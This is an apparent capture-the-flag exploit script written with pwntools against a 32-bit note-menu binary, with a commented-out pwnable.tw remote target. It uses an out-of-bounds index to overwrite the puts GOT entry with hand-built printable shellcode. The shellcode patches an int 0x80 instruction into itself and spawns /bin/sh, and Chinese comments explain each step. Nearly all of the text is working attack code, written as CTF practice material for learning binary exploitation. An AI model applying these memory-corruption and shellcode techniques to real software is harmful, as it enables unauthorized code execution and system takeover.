from pwn import *
context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
#io = remote('chall.pwnable.tw', 10201)
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()


menu = b'Your choice :'
def add(idx, content):
	sla(menu, b'1')
	sla(b'Index :', byte(idx))
	sla(b'Name :', content)

def show(idx):
	sla(menu, b'2')
	sla(b'Index :', byte(idx))

def dele(idx):
	sla(menu, b'3')
	sla(b'Index :', byte(idx))

note = 0x0804A060
offset = (elf.got['puts'] - note) // 4
print(offset)
shellcode = '''
	/* execve(/bin///sh, NULL, NULL) */
	/* ebx -> "/bin///sh" */
	push 0x68
	push 0x732f2f2f
	push 0x6e69622f
	push esp
	pop ebx	

	/* 构造 int 0x80 -> \xcd\x80 */
	/* edx 指向的就是 shellcode 的开始地址 */
	/* -51 == FFFFFFCD  -128 == FFFFFF80 */
	/* 33 - 84 = 0x21 - 0x54 = -51 */
	/* 0x40 - 0x60 -  0x60=  -128 */
	/* shellcode+0x34/0x35 --> \xcd\x80  */
	push edx
	pop eax
	push 0x54
	pop edx		
	sub byte ptr[eax+0x27], dl
	push 0x60
	pop edx
	sub byte ptr[eax+0x28], dl
	sub byte ptr[eax+0x28], dl	
	
	/* ecx 本身就为0, 设置 edx = 0 */
	push ecx
	pop edx

	/* 设置 eax 为系统调用号 0xb = 11*/
	push edx
	pop eax	
	xor al, 0x50
	xor al, 0x5b

'''
shellcode = asm(shellcode) + b'\x21\x40'
print(hex(len(shellcode) - 2))
print(shellcode)
debug()
add(offset, shellcode)
sh()
